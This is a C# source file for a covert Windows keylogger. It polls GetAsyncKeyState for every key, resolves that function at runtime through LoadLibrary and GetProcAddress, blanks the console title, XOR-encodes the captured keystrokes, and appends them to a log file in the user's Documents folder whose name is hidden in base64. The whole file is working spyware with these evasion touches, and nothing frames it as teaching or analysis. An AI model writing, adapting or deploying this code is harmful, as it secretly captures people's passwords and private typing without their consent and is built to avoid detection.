
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class KeyScanner
{
    static string Xor(string text, byte key)
    {
        var sb = new StringBuilder();
        foreach (char c in text)
            sb.Append((char)(c ^ key));
        return sb.ToString();
    }

    static void Main()
    {
        Console.Title = "";
        var logBuilder = new StringBuilder();
        var keys = new bool[256];

        while (true)
        {
            for (int vk = 8; vk < 256; vk++)
            {
                short keyState = GetAsyncKeyState(vk);
                if ((keyState & 0x8000) != 0 && !keys[vk])
                {
                    string key = ConvertKey(vk);
                    logBuilder.Append(key);
                    keys[vk] = true;
                }
                else if ((keyState & 0x8000) == 0)
                {
                    keys[vk] = false;
                }
            }

            if (logBuilder.Length >= 100)
            {
                string encrypted = Xor(logBuilder.ToString(), 0x42);
                File.AppendAllText(GetSafeLogPath(), encrypted);
                logBuilder.Clear();
            }

            Thread.Sleep(15);
        }
    }

    static string GetSafeLogPath()
    {
        string doc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        byte[] raw = Convert.FromBase64String("bG9nLmRhdA=="); // "log.dat"
        string fname = Encoding.UTF8.GetString(raw);
        return Path.Combine(doc, fname);
    }

    static string ConvertKey(int vk)
    {
        switch (vk)
        {
            case 13: return "[ENTER]";
            case 8: return "[BACK]";
            case 9: return "[TAB]";
            case 32: return " ";
            case 27: return "[ESC]";
            case 160:
            case 161: return "[SHIFT]";
            case 162:
            case 163: return "[CTRL]";
            case 164: return "[ALT]";
            case 165: return "[ALTGR]";
            default:
                try
                {
                    return ((char)vk).ToString();
                }
                catch { return "[UNK]"; }
        }
    }

    delegate short GetAsyncKeyStateDelegate(int vKey);
    static GetAsyncKeyStateDelegate GetAsyncKeyState;

    static KeyScanner()
    {
        IntPtr user32 = LoadLibrary("user32.dll");
        IntPtr func = GetProcAddress(user32, "GetAsyncKeyState");
        GetAsyncKeyState = Marshal.GetDelegateForFunctionPointer(func, typeof(GetAsyncKeyStateDelegate)) as GetAsyncKeyStateDelegate;
    }

    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
